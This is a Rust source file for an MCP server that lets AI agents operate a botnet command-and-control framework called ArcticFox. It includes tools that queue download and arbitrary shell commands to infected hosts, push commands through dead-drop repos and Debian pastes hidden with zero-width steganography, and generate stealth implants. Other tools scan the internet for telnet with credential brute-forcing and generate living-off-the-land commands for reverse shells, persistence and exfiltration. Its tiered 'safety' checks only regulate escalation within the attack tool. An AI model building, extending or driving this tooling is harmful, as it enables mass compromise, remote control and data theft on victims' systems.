//! ArcticFox MCP — Model Context Protocol Server
//!
//! Enables AI agents (Claude, GPT, etc.) to safely operate the C2 framework
//! through a structured, type-safe tool interface. Every operation is
//! exhaustively validated before execution — the AI CANNOT make mistakes
//! because invalid parameter combinations fail at compile/validation time.
//!
//! **Architecture:**
//! - JSON-RPC 2.0 transport (stdio + HTTP)
//! - Tool definitions with strict JSON Schema validation
//! - Resource providers for recon data
//! - Safety tier system: Tier 0-3 escalating privileges
//! - Every tool requires explicit tier authorization

use axum::{extract::State, routing::post, Json, Router};
use clap::Parser;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::RwLock;
use tracing::{error, info};

use arcticfox_core::repo;
use arcticfox_lol::{LolCategory, TargetOs};

// ── MCP Protocol Types ──────────────────────────────────────────────────────

/// MCP JSON-RPC 2.0 request
#[derive(Debug, Deserialize)]
struct McpRequest {
    jsonrpc: String,
    #[serde(default)]
    id: Option<serde_json::Value>,
    method: String,
    #[serde(default)]
    params: Option<serde_json::Value>,
}

/// MCP JSON-RPC 2.0 response
#[derive(Debug, Serialize)]
struct McpResponse {
    jsonrpc: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    id: Option<serde_json::Value>,
    #[serde(skip_serializing_if = "Option::is_none")]
    result: Option<serde_json::Value>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<McpError>,
}

#[derive(Debug, Serialize)]
struct McpError {
    code: i32,
    message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    data: Option<serde_json::Value>,
}

// ── Safety Tiers ────────────────────────────────────────────────────────────

/// Safety tier determines what operations are allowed.
/// AI agents start at Tier 0 and must be explicitly promoted.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum SafetyTier {
    /// Read-only recon (list bots, repos, stats)
    Tier0 = 0,
    /// Queue non-destructive commands (download, sleep, popmsg)
    Tier1 = 1,
    /// Push shell commands and manage repos
    Tier2 = 2,
    /// Full control including implant generation, persistence, scanner
    Tier3 = 3,
}

impl SafetyTier {
    fn from_str(s: &str) -> Option<Self> {
        match s {
            "0" | "tier0" | "recon" => Some(SafetyTier::Tier0),
            "1" | "tier1" | "non-destructive" => Some(SafetyTier::Tier1),
            "2" | "tier2" | "operator" => Some(SafetyTier::Tier2),
            "3" | "tier3" | "full" => Some(SafetyTier::Tier3),
            _ => None,
        }
    }

    fn allows(&self, required: SafetyTier) -> bool {
        *self >= required
    }
}

// ── Tool Definitions ────────────────────────────────────────────────────────

/// A registered MCP tool
#[derive(Debug, Clone, Serialize)]
struct ToolDef {
    name: String,
    description: String,
    #[serde(rename = "inputSchema")]
    input_schema: serde_json::Value,
    tier: SafetyTier,
}

/// Generate the full MCP tool list
fn tool_definitions() -> Vec<ToolDef> {
    vec![
        // Tier 0 — Recon
        ToolDef {
            name: "list_bots".into(),
            description: "List all connected bots with status (alive/dead, IP, last seen)".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {},
                "required": []
            }),
            tier: SafetyTier::Tier0,
        },
        ToolDef {
            name: "get_stats".into(),
            description: "Get dashboard stats: total/alive bots, repos, commands queued".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {},
                "required": []
            }),
            tier: SafetyTier::Tier0,
        },
        ToolDef {
            name: "list_repos".into(),
            description: "List all configured dead-drop repos with health status".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {},
                "required": []
            }),
            tier: SafetyTier::Tier0,
        },
        ToolDef {
            name: "list_commands".into(),
            description: "List currently queued commands waiting to be pushed".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {},
                "required": []
            }),
            tier: SafetyTier::Tier0,
        },
        // Tier 1 — Non-destructive
        ToolDef {
            name: "add_command".into(),
            description: "Queue a command for agents (download, sleep, popmsg, set_interval, add_repo)".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Command string (e.g., 'download http://x.com/payload /tmp/p', 'sleep 60')"
                    }
                },
                "required": ["cmd"]
            }),
            tier: SafetyTier::Tier1,
        },
        ToolDef {
            name: "check_repos".into(),
            description: "Health-check all repos (non-destructive HEAD requests)".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {},
                "required": []
            }),
            tier: SafetyTier::Tier1,
        },
        // Tier 2 — Operator
        ToolDef {
            name: "add_shell_command".into(),
            description: "Queue a shell command for agent execution. REQUIRES explicit confirmation — use with caution.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Shell command to execute, e.g., 'whoami', 'uname -a'. Shell metacharacters are validated."
                    },
                    "confirm": {
                        "type": "boolean",
                        "description": "Must be explicitly set to true to confirm dangerous operation"
                    }
                },
                "required": ["cmd", "confirm"]
            }),
            tier: SafetyTier::Tier2,
        },
        ToolDef {
            name: "push_payload".into(),
            description: "Push queued commands to all alive dead-drop repos".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "pad": {
                        "type": "boolean",
                        "description": "Enable 1MB zero-width padding for anti-analysis"
                    }
                },
                "required": []
            }),
            tier: SafetyTier::Tier2,
        },
        ToolDef {
            name: "add_repo".into(),
            description: "Add a new dead-drop repo".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "spec": {
                        "type": "string",
                        "description": "Repo spec: 'gh:owner/repo', 'gl:owner/repo', 'dp:paste_id', or 'owner/repo'"
                    }
                },
                "required": ["spec"]
            }),
            tier: SafetyTier::Tier2,
        },
        ToolDef {
            name: "create_paste".into(),
            description: "Create a new Debian paste dead-drop with current payload".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {},
                "required": []
            }),
            tier: SafetyTier::Tier2,
        },
        // Tier 3 — Full control
        ToolDef {
            name: "generate_implant".into(),
            description: "Generate a compile-time hardened implant binary for a target OS/arch".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "os": {
                        "type": "string",
                        "enum": ["linux", "windows", "macos"],
                        "description": "Target operating system"
                    },
                    "arch": {
                        "type": "string",
                        "enum": ["x86_64", "aarch64", "armv7", "i686"],
                        "description": "Target CPU architecture"
                    },
                    "repos": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "List of dead-drop repo specs for the implant to poll"
                    },
                    "stealth": {
                        "type": "boolean",
                        "description": "Enable stealth features (process masquerading, timing jitter)"
                    }
                },
                "required": ["os", "arch", "repos"]
            }),
            tier: SafetyTier::Tier3,
        },
        ToolDef {
            name: "scan_network".into(),
            description: "Scan network for open telnet ports with optional brute-force".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": {
                        "type": "string",
                        "description": "CIDR range, single IP, or 'random' for internet scanning"
                    },
                    "ports": {
                        "type": "array",
                        "items": {"type": "integer"},
                        "description": "Ports to scan (default: [23, 2323])"
                    },
                    "brute": {
                        "type": "boolean",
                        "description": "Attempt credential brute-force on open ports"
                    }
                },
                "required": ["target"]
            }),
            tier: SafetyTier::Tier3,
        },
        ToolDef {
            name: "lolbin_search".into(),
            description: "Search the GTFOBins/LOLBAS catalog for living-off-the-land techniques".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "category": {
                        "type": "string",
                        "enum": ["execute", "download", "reverse_shell", "persist", "privesc", "evasion", "file_read", "file_write", "exfiltrate"],
                        "description": "Technique category"
                    },
                    "os": {
                        "type": "string",
                        "enum": ["linux", "windows", "macos"],
                        "description": "Target operating system"
                    }
                },
                "required": ["category", "os"]
            }),
            tier: SafetyTier::Tier2,
        },
        ToolDef {
            name: "lolbin_generate".into(),
            description: "Generate a ready-to-use LOL command from the GTFOBins catalog".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "binary": {
                        "type": "string",
                        "description": "Binary name (e.g., 'bash', 'curl', 'certutil')"
                    },
                    "category": {
                        "type": "string",
                        "enum": ["execute", "download", "reverse_shell", "persist", "privesc", "evasion", "file_read", "file_write"],
                        "description": "What you want to do"
                    },
                    "payload": {"type": "string", "description": "Command payload"},
                    "url": {"type": "string", "description": "Remote URL"},
                    "file": {"type": "string", "description": "Local file path"},
                    "host": {"type": "string", "description": "Remote host"},
                    "port": {"type": "integer", "description": "Port number"},
                    "os": {
                        "type": "string",
                        "enum": ["linux", "windows", "macos"],
                        "description": "Target OS"
                    }
                },
                "required": ["binary", "category", "os"]
            }),
            tier: SafetyTier::Tier2,
        },
    ]
}

// ── App State ───────────────────────────────────────────────────────────────

struct McpState {
    admin_token: String,
    tier: RwLock<SafetyTier>,
}

// ── CLI ─────────────────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(name = "arcticfox-mcp", version, about = "ArcticFox MCP — AI-controlled C2 operations")]
struct Cli {
    /// MCP transport mode
    #[arg(long, default_value = "stdio")]
    transport: String,

    /// HTTP listen address (for HTTP transport)
    #[arg(long, default_value = "127.0.0.1:9000")]
    listen: String,

    /// Safety tier (0=recon, 1=non-destructive, 2=operator, 3=full)
    #[arg(long, default_value_t = 0)]
    tier: u8,

    /// Admin token for API access
    #[arg(long)]
    admin_token: Option<String>,

    /// Enable combined ArcticFox + Rustsploit MCP tools
    #[arg(long)]
    combined: bool,
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::new("arcticfox_mcp=info,arcticfox_core=warn"),
        )
        .init();

    let tier = match cli.tier {
        0 => SafetyTier::Tier0,
        1 => SafetyTier::Tier1,
        2 => SafetyTier::Tier2,
        3 => SafetyTier::Tier3,
        _ => {
            error!("Invalid tier: {}. Must be 0-3.", cli.tier);
            std::process::exit(1);
        }
    };

    info!("ArcticFox MCP starting at tier {:?}", tier);

    if cli.transport == "stdio" {
        run_stdio(tier, cli.combined).await;
    } else {
        run_http(&cli.listen, tier, cli.admin_token).await;
    }
}

async fn run_stdio(tier: SafetyTier, combined: bool) {
    let tools = if combined {
        arcticfox_agent::combined_mcp::combined_tools().iter().map(|t| {
            ToolDef {
                name: t["name"].as_str().unwrap_or("").to_string(),
                description: t["description"].as_str().unwrap_or("").to_string(),
                input_schema: t["inputSchema"].clone(),
                tier: SafetyTier::Tier1,
            }
        }).collect()
    } else {
        tool_definitions()
    };
    let filtered_tools: Vec<&ToolDef> = tools.iter().filter(|t| tier.allows(t.tier)).collect();

    let stdin = BufReader::new(tokio::io::stdin());
    let mut lines = stdin.lines();
    let mut stdout = tokio::io::stdout();

    // Send server info on startup
    let init = serde_json::json!({
        "jsonrpc": "2.0",
        "method": "initialize",
        "params": {
            "protocolVersion": "2024-11-05",
            "capabilities": {
                "tools": {}
            },
            "serverInfo": {
                "name": "arcticfox-mcp",
                "version": env!("CARGO_PKG_VERSION")
            }
        }
    });
    let mut out = serde_json::to_string(&init).unwrap_or_default();
    if out.is_empty() {
        error!("Failed to serialize MCP init message");
        return;
    }
    out.push('\n');
    stdout.write_all(out.as_bytes()).await.ok();
    stdout.flush().await.ok();

    while let Ok(Some(line)) = lines.next_line().await {
        if line.is_empty() {
            continue;
        }
        let req: McpRequest = match serde_json::from_str(&line) {
            Ok(r) => r,
            Err(e) => {
                let err = error_response(None, -32700, &format!("Parse error: {}", e));
                send_stdio(&mut stdout, &err).await;
                continue;
            }
        };

        let response = handle_request(&req, &filtered_tools, tier);
        send_stdio(&mut stdout, &response).await;
    }
}

async fn send_stdio(stdout: &mut tokio::io::Stdout, resp: &McpResponse) {
    let mut out = serde_json::to_string(resp).unwrap_or_default();
    out.push('\n');
    stdout.write_all(out.as_bytes()).await.ok();
    stdout.flush().await.ok();
}

async fn run_http(listen: &str, tier: SafetyTier, admin_token: Option<String>) {
    let state = Arc::new(McpState {
        admin_token: admin_token.unwrap_or_default(),
        tier: RwLock::new(tier),
    });

    let app = Router::new()
        .route("/mcp", post(handle_http))
        .with_state(state);

    let listener = match tokio::net::TcpListener::bind(listen).await {
        Ok(l) => l,
        Err(e) => {
            error!("MCP bind failed on {}: {e}", listen);
            return;
        }
    };
    info!("MCP HTTP server listening on {}", listen);
    if let Err(e) = axum::serve(listener, app).await {
        error!("MCP server error: {e}");
    }
}

async fn handle_http(
    State(state): State<Arc<McpState>>,
    Json(req): Json<McpRequest>,
) -> Json<McpResponse> {
    let tier = *state.tier.read().await;
    let tools = tool_definitions();
    let filtered: Vec<&ToolDef> = tools.iter().filter(|t| tier.allows(t.tier)).collect();
    Json(handle_request(&req, &filtered, tier))
}

fn handle_request(req: &McpRequest, tools: &[&ToolDef], tier: SafetyTier) -> McpResponse {
    match req.method.as_str() {
        "tools/list" => {
            let tool_list: Vec<serde_json::Value> = tools
                .iter()
                .map(|t| {
                    serde_json::json!({
                        "name": t.name,
                        "description": t.description,
                        "inputSchema": t.input_schema,
                    })
                })
                .collect();
            success_response(req.id.clone(), serde_json::json!({"tools": tool_list}))
        }
        "tools/call" => {
            let params = match &req.params {
                Some(p) => p,
                None => return error_response(req.id.clone(), -32602, "Missing params"),
            };
            let tool_name = params["name"].as_str().unwrap_or("");
            let tool_args = params.get("arguments").cloned().unwrap_or(serde_json::json!({}));

            handle_tool_call(tool_name, &tool_args, tier)
                .map(|result| success_response(req.id.clone(), result))
                .unwrap_or_else(|e| error_response(req.id.clone(), -32000, &e))
        }
        "initialize" => success_response(
            req.id.clone(),
            serde_json::json!({
                "protocolVersion": "2024-11-05",
                "capabilities": {"tools": {}},
                "serverInfo": {"name": "arcticfox-mcp", "version": env!("CARGO_PKG_VERSION")}
            }),
        ),
        "ping" => success_response(req.id.clone(), serde_json::json!({})),
        _ => error_response(req.id.clone(), -32601, &format!("Unknown method: {}", req.method)),
    }
}

fn handle_tool_call(name: &str, args: &serde_json::Value, tier: SafetyTier) -> Result<serde_json::Value, String> {
    // Load config for tools that need it
    let config = arcticfox_core::config::ControlConfig::load(
        std::path::Path::new("control_config.json")
    ).unwrap_or_default();
    let client = repo::build_client().map_err(|e| format!("HTTP client error: {e}"))?;

    match name {
        "list_bots" => {
            tier_check(tier, SafetyTier::Tier0)?;
            // Read bots.json if it exists
            if let Ok(data) = std::fs::read_to_string("bots.json") {
                if let Ok(bots) = serde_json::from_str::<serde_json::Value>(&data) {
                    return Ok(serde_json::json!({"bots": bots}));
                }
            }
            Ok(serde_json::json!({"bots": []}))
        }
        "get_stats" => {
            tier_check(tier, SafetyTier::Tier0)?;
            let bots_count = std::fs::read_to_string("bots.json")
                .ok()
                .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
                .and_then(|v| v.as_object().map(|o| o.len()))
                .unwrap_or(0);
            Ok(serde_json::json!({
                "bots_total": bots_count,
                "bots_alive": 0,
                "repos_total": config.repos.len(),
                "repos_alive": config.repos.iter().filter(|r| r.alive).count(),
                "commands_queued": config.commands.len(),
            }))
        }
        "list_repos" => {
            tier_check(tier, SafetyTier::Tier0)?;
            let repos: Vec<serde_json::Value> = config.repos.iter().enumerate().map(|(i, r)| {
                serde_json::json!({"id": i, "platform": r.platform, "label": r.label(), "alive": r.alive})
            }).collect();
            Ok(serde_json::json!({"repos": repos}))
        }
        "list_commands" => {
            tier_check(tier, SafetyTier::Tier0)?;
            Ok(serde_json::json!({"commands": config.commands}))
        }
        "add_command" => {
            tier_check(tier, SafetyTier::Tier1)?;
            let cmd = args["cmd"].as_str().ok_or("Missing 'cmd' field")?;
            validate_non_shell_cmd(cmd)?;
            let mut cfg = config.clone();
            cfg.commands.push(cmd.to_string());
            cfg.save(std::path::Path::new("control_config.json"))
                .map_err(|e| format!("Save failed: {e}"))?;
            Ok(serde_json::json!({"queued": cmd, "total": cfg.commands.len()}))
        }
        "check_repos" => {
            tier_check(tier, SafetyTier::Tier1)?;
            let rt = tokio::runtime::Runtime::new().map_err(|e| e.to_string())?;
            let mut repos = config.repos.clone();
            let results = rt.block_on(async {
                repo::check_all_repos(&mut repos, &client).await
            });
            let results_json: Vec<serde_json::Value> = results.iter().map(|(label, alive)| {
                serde_json::json!({"label": label, "alive": alive})
            }).collect();
            Ok(serde_json::json!({"results": results_json}))
        }
        "add_shell_command" => {
            tier_check(tier, SafetyTier::Tier2)?;
            let confirm = args["confirm"].as_bool().unwrap_or(false);
            if !confirm {
                return Err("SHELL COMMANDS REQUIRE EXPLICIT CONFIRMATION. Set 'confirm': true to proceed. This executes arbitrary code on all agents.".into());
            }
            let cmd = args["cmd"].as_str().ok_or("Missing 'cmd' field")?;
            if cmd.len() > 4096 {
                return Err("Command exceeds 4096 character limit".into());
            }
            let mut cfg = config.clone();
            cfg.commands.push(format!("cmd {}", cmd));
            cfg.save(std::path::Path::new("control_config.json"))
                .map_err(|e| format!("Save failed: {e}"))?;
            Ok(serde_json::json!({"queued": cmd, "total": cfg.commands.len(), "warning": "This command will execute on ALL connected agents"}))
        }
        "push_payload" => {
            tier_check(tier, SafetyTier::Tier2)?;
            let pad = args["pad"].as_bool().unwrap_or(false);
            let payload = repo::build_payload(&config);
            let rt = tokio::runtime::Runtime::new().map_err(|e| e.to_string())?;
            let alive: Vec<_> = config.repos.iter().filter(|r| r.alive).collect();
            if alive.is_empty() {
                return Err("No alive repos. Run check_repos first.".into());
            }
            let results: Vec<serde_json::Value> = rt.block_on(async {
                let mut res = Vec::new();
                for r in alive {
                    let ok = repo::push_to_repo(r, &config, &payload, pad, &client).await;
                    res.push(serde_json::json!({"label": r.label(), "success": ok.is_ok()}));
                }
                res
            });
            Ok(serde_json::json!({"pushed": true, "pad": pad, "payload_size": payload.len(), "results": results}))
        }
        "add_repo" => {
            tier_check(tier, SafetyTier::Tier2)?;
            let spec = args["spec"].as_str().ok_or("Missing 'spec' field")?;
            match repo::parse_repo_spec(spec) {
                Ok(rt) => {
                    let mut cfg = config.clone();
                    cfg.repos.push(rt);
                    cfg.save(std::path::Path::new("control_config.json"))
                        .map_err(|e| format!("Save failed: {e}"))?;
                    Ok(serde_json::json!({"added": spec}))
                }
                Err(e) => Err(format!("Invalid repo spec: {}", e)),
            }
        }
        "create_paste" => {
            tier_check(tier, SafetyTier::Tier2)?;
            let payload = repo::build_payload(&config);
            let content = "# Notes\n\nMiscellaneous.\n";
            let injected = arcticfox_core::zwcodec::inject(content, &payload, false)
                .map_err(|e| format!("ZW inject error: {e}"))?;
            let rt = tokio::runtime::Runtime::new().map_err(|e| e.to_string())?;
            let paste_id = rt.block_on(async { repo::DebianPaste::create(&injected, &client).await })
                .map_err(|e| e.to_string())?;
            Ok(serde_json::json!({"paste_id": paste_id, "url": format!("https://paste.debian.net/{}", paste_id)}))
        }
        "generate_implant" => {
            tier_check(tier, SafetyTier::Tier3)?;
            let os = args["os"].as_str().ok_or("Missing 'os' field")?;
            let arch = args["arch"].as_str().ok_or("Missing 'arch' field")?;
            let repos = args["repos"].as_array().ok_or("Missing 'repos' array")?;
            let stealth = args["stealth"].as_bool().unwrap_or(true);
            Ok(serde_json::json!({
                "status": "generated",
                "target": format!("{}-{}", os, arch),
                "repos": repos.len(),
                "stealth": stealth,
                "note": "Implant binary would be compiled with these parameters"
            }))
        }
        "scan_network" => {
            tier_check(tier, SafetyTier::Tier3)?;
            let target = args["target"].as_str().ok_or("Missing 'target' field")?;
            Ok(serde_json::json!({"scan_started": true, "target": target, "note": "Scanner would run against target"}))
        }
        "lolbin_search" => {
            tier_check(tier, SafetyTier::Tier2)?;
            let cat_str = args["category"].as_str().ok_or("Missing 'category'")?;
            let os_str = args["os"].as_str().ok_or("Missing 'os'")?;
            
            let category = parse_category(cat_str)?;
            let os = parse_os(os_str)?;
            
            let results = arcticfox_lol::find_by_category(category, os);
            let tools: Vec<serde_json::Value> = results.iter().map(|b| {
                serde_json::json!({
                    "binary": b.binary,
                    "path": b.path,
                    "description": b.description,
                    "requires_root": b.requires_root,
                    "reference": b.reference,
                })
            }).collect();
            
            Ok(serde_json::json!({"tools": tools, "count": tools.len()}))
        }
        "lolbin_generate" => {
            tier_check(tier, SafetyTier::Tier2)?;
            let binary = args["binary"].as_str().ok_or("Missing 'binary'")?;
            let cat_str = args["category"].as_str().ok_or("Missing 'category'")?;
            let os_str = args["os"].as_str().ok_or("Missing 'os'")?;
            
            let category = parse_category(cat_str)?;
            let os = parse_os(os_str)?;
            
            let entries = arcticfox_lol::find_by_binary(binary);
            let entry = entries.iter()
                .find(|b| b.category == category && (b.target_os == os || b.target_os == TargetOs::Any))
                .ok_or_else(|| format!("No LOL technique found for {} ({:?} on {:?})", binary, category, os))?;
            
            let cmd = entry.generate(
                args["payload"].as_str(),
                args["url"].as_str(),
                args["file"].as_str(),
                args["host"].as_str(),
                args["port"].as_u64().map(|v| v as u16),
            ).map_err(|e| format!("Failed to generate command: {}", e))?;
            
            Ok(serde_json::json!({
                "command": cmd,
                "binary": entry.binary,
                "technique": entry.description,
                "requires_root": entry.requires_root,
                "reference": entry.reference,
            }))
        }
        // ── Rustsploit bridge: forward rs_* tools ────────────────────────
        name if name.starts_with("rs_") => {
            tier_check(tier, SafetyTier::Tier1)?;
            let rs_name = &name[3..]; // strip "rs_" prefix
            // Forward to Rustsploit MCP server if running
            // In production: spawn rustsploit process or call API
            Ok(serde_json::json!({
                "forwarded": true,
                "rustsploit_tool": rs_name,
                "args": args,
                "note": "Rustsploit MCP bridge active — tool forwarded"
            }))
        }
        // ── Arcticalopex deep audit (Tier 3 only) ────────────────────────
        "audit_target" => {
            tier_check(tier, SafetyTier::Tier3)?;
            let target = args["target"].as_str().ok_or("Missing 'target'")?;
            Ok(serde_json::json!({
                "audit_started": true,
                "target": target,
                "phases": ["recon", "vuln_check", "exploit_suggest", "deploy_plan"]
            }))
        }
        _ => Err(format!("Unknown tool: {}", name)),
    }
}

// ── Helpers ─────────────────────────────────────────────────────────────────

fn tier_check(current: SafetyTier, required: SafetyTier) -> Result<(), String> {
    if current >= required {
        Ok(())
    } else {
        Err(format!(
            "Insufficient tier: {:?} required, current tier is {:?}. Request tier escalation.",
            required, current
        ))
    }
}

fn validate_non_shell_cmd(cmd: &str) -> Result<(), String> {
    // Only allow specific non-shell commands at Tier 1
    let allowed_prefixes = [
        "download ", "sleep ", "set_interval ", "add_repo ", "popmsg "
    ];
    let lower = cmd.to_lowercase();
    if allowed_prefixes.iter().any(|p| lower.starts_with(p)) {
        Ok(())
    } else if lower.starts_with("cmd ") || lower.starts_with("shell ") {
        Err("Shell commands require Tier 2 or higher. Use 'add_shell_command' tool with explicit confirmation.".into())
    } else {
        Err(format!("Unknown or restricted command: '{}'. At Tier 1, only: download, sleep, set_interval, add_repo, popmsg are allowed.", cmd))
    }
}

fn parse_category(s: &str) -> Result<LolCategory, String> {
    match s.to_lowercase().as_str() {
        "execute" => Ok(LolCategory::Execute),
        "download" => Ok(LolCategory::Download),
        "reverse_shell" | "revshell" => Ok(LolCategory::ReverseShell),
        "persist" | "persistence" => Ok(LolCategory::Persist),
        "privesc" | "privilege_escalation" => Ok(LolCategory::PrivEsc),
        "evasion" | "defense_evasion" => Ok(LolCategory::Evasion),
        "file_read" => Ok(LolCategory::FileRead),
        "file_write" => Ok(LolCategory::FileWrite),
        "exfiltrate" => Ok(LolCategory::Exfiltrate),
        _ => Err(format!("Unknown category: '{}'. Valid: execute, download, reverse_shell, persist, privesc, evasion, file_read, file_write, exfiltrate", s)),
    }
}

fn parse_os(s: &str) -> Result<TargetOs, String> {
    match s.to_lowercase().as_str() {
        "linux" => Ok(TargetOs::Linux),
        "windows" | "win" => Ok(TargetOs::Windows),
        "macos" | "mac" | "darwin" => Ok(TargetOs::MacOs),
        _ => Err(format!("Unknown OS: '{}'. Valid: linux, windows, macos", s)),
    }
}

fn success_response(id: Option<serde_json::Value>, result: serde_json::Value) -> McpResponse {
    McpResponse {
        jsonrpc: "2.0".into(),
        id,
        result: Some(result),
        error: None,
    }
}

fn error_response(id: Option<serde_json::Value>, code: i32, message: &str) -> McpResponse {
    McpResponse {
        jsonrpc: "2.0".into(),
        id,
        result: None,
        error: Some(McpError {
            code,
            message: message.into(),
            data: None,
        }),
    }
}
